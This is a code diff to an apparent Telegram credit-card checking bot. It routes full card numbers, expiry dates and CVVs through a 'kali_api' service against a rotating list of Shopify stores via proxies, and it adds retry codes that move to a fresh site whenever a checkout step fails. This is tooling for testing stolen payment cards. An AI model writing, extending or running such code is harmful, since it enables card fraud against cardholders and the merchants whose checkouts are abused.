@@ -8,6 +8,7 @@ import time
 import string
 import psycopg2.extras
 import os
+import urllib.parse
 from datetime import datetime
 from typing import Optional, Tuple, List
 from io import BytesIO, RawIOBase
@@ -163,8 +164,12 @@ async def _safe_answer(callback: types.CallbackQuery, text: str = "", **kw):
 
 
 
-#API_BASE_URL = "http://127.0.0.1:8080/sh"
-API_BASE_URL = "http://127.0.0.1:8080/sh"
+# kali_api (kali_api/main.py) - mass lane
+API_BASE_URL = os.environ.get("KALI_API_URL", "http://127.0.0.1:8080/shopii")
+API_KEY = os.environ.get("KALI_API_KEY", "ladle")
+
+# site source: the v7 rotation list
+SITES_FILE = os.environ.get("KALI_SITES_FILE", os.path.join(_SHOPIFY_DIR, "v7", "site.txt"))
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CALLBACK DATA
@@ -598,6 +603,9 @@ RETRY_ERRORS = [
     'timeout', 'proxy error',
     'api error', 'rejected', 'processing', 'poll failed', 'exceeded',
 
+    # kali_api infra codes -> retry on a fresh site
+    'no_products', 'cart_error', 'proposal_error', 'pci_error',
+    'submit_error', 'poll_timeout', 'missing_site', 'no token/session',
     'step 0 failed',
     'step 1 failed',
     'step 2 failed',
@@ -727,11 +735,11 @@ def is_expired(mm: str, yy: str) -> bool:
 def get_sites():
     sites = []
     try:
-        if os.path.exists(os.path.join(_SHOPIFY_DIR, "site.txt")):
-            with open(os.path.join(_SHOPIFY_DIR, "site.txt"), "r", encoding="utf-8", errors="ignore") as f:
+        if os.path.exists(SITES_FILE):
+            with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                 sites = [line.strip() for line in f if line.strip()]
     except Exception as e:
-        logging.error(f"Error reading sites.txt: {e}")
+        logging.error(f"Error reading {SITES_FILE}: {e}")
     return sites
 
 def get_user_display(user_obj, plan_name):
@@ -751,7 +759,9 @@ async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, pro
     import aiohttp
 
     cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
-    api_url = f"{API_BASE_URL}?cc={cc_formatted}&proxy={proxy}&key=ladle"
+    api_url = API_BASE_URL + "?" + urllib.parse.urlencode(
+        {"cc": cc_formatted, "site": site, "proxy": proxy, "key": API_KEY}
+    )
 
     logging.debug(f"[API] Processing {cc[:6]}**** via {mask_proxy(proxy)}")
 
@@ -789,9 +799,14 @@ async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, pro
                     http_status
                 )
             else:
+                try:
+                    err_body = await response.json()
+                    err_resp = err_body.get("Response") or f"HTTP {response.status}"
+                except Exception:
+                    err_resp = f"API Error: HTTP {response.status}"
                 return (
                     False,
-                    f"API Error: HTTP {response.status}",
+                    err_resp,
                     site,
                     "Shopify Payments",
                     "0.00",
